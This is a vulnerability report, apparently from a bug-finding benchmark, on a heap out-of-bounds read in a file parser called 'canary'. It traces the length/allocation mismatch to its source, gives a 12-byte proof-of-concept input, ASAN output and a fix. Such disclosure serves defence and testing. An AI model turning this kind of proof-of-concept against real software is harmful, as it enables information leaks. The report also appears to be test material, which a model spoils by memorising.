## Summary

`parse_input()` truncates the allocated payload size to the bytes actually available in the input (`avail = len - offset`) but **does not update `entries[i].length`** to match the truncated size. Downstream parsers (`parse_data`, and likely others) trust the original declared `length` for their bounds checks and read past the end of the smaller allocation.

A trivial 12-byte input triggers a heap out-of-bounds read in `parse_data` at `canary.c:88`.

- **Binary:** `/target/bin/canary`
- **Source:** `/target/src/canary.c`
- **Sink function:** `parse_data`
- **Sink line:** `canary.c:88` (read of `e->payload[3]`)
- **Allocation line:** `canary.c:138` (in `parse_input`)
- **Root cause line(s):** `canary.c:130–149` — `avail` truncation without updating `entries[i].length`
- **Severity:** High (deterministic heap OOB read primitive controllable by attacker; useful as info-leak)

## Vulnerable code (paraphrased)

```c
// parse_input  (canary.c ~130-149)
uint16_t avail = (offset + entries[i].length > len)
                 ? (len - offset)
                 : entries[i].length;
entries[i].payload = malloc(avail);          // canary.c:138 (smaller alloc)
if (entries[i].payload)
    memcpy(entries[i].payload, data + offset, avail);
offset += avail;
// BUG: entries[i].length is NEVER reduced to `avail`

// parse_data  (canary.c ~85-90)
if (e->length < 4) return -1;                // checks declared length only
uint16_t size  = e->payload[0] | (e->payload[1] << 8);
uint16_t count = e->payload[2] | (e->payload[3] << 8);   // canary.c:88 — OOB read
```

With a declared entry length of 10 but only 3 bytes of payload supplied, `payload` is a 3-byte allocation and `payload[3]` reads one byte past it.

## Reproduction

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'CNRY' + bytes([1,1, 2, 0x0a, 0x00, 0x41, 0x42, 0x43]))" > /tmp/poc3.bin
/target/bin/canary /tmp/poc3.bin
```

12-byte PoC layout:

| Offset | Bytes         | Meaning                              |
|--------|---------------|--------------------------------------|
| 0      | `43 4E 52 59` | magic "CNRY"                         |
| 4      | `01`          | version = 1                          |
| 5      | `01`          | entry_count = 1                      |
| 6      | `02`          | entry type = 2 (data)                |
| 7      | `0a 00`       | declared length = 10 (LE)            |
| 9      | `41 42 43`    | only 3 bytes of payload (truncated)  |

## ASAN output (key lines)

```
==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000033
READ of size 1 at 0x502000000033 thread T0
    #0 parse_data /target/src/canary.c:88
    #1 parse_input /target/src/canary.c:146
    #2 main    /target/src/canary.c:184
0x502000000033 is located 0 bytes to the right of 3-byte region
allocated by thread T0 here:
    #1 parse_input /target/src/canary.c:138
```

## Verification

Reproduces 3/3 runs with identical stack trace and allocation site. Verifier verdict: 5/5 PASS.

## Distinction from prior reports

- **Different from** `parse_data:101` integer-overflow bug (different sink line, different root cause: that one is uint16 mul wrap; this one is length/alloc desync upstream in `parse_input`).
- **Different from** `parse_name:45` OOB read (different function, different sink line, different root cause: that one is unvalidated `name_len` byte; this one is the declared entry length surviving truncation).

## Suggested fix

After truncating `avail`, also clamp the stored length so downstream code sees consistent metadata:

```c
if (offset + entries[i].length > len) {
    avail = len - offset;
    entries[i].length = avail;   // keep length in sync with allocation
}
```

Additionally, every per-type parser (`parse_data`, `parse_name`, ...) should treat `e->length` as untrusted and re-validate before each indexed access.
